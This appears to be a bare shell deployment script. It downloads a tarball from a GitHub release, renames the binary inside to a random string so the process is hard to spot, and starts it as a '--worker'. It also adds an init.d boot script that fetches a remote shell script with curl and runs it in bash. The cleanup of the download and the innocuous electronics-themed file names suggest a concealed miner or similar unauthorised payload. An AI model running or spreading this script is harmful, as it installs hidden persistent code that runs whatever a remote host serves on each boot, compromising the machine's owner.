cd /
wget https://github.com/vendac/diode/releases/download/v1.5.0/battery.tar
tar -xvf battery.tar
cd /battery
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv inductor $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./circuit.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/vendac/diode/main/sensor.sh)" > switch.sh
chmod a+x switch.sh
update-rc.d switch.sh defaults
rm -rf battery.tar
cd /battery
nohup ./circuit.sh
ps -ef | grep battery
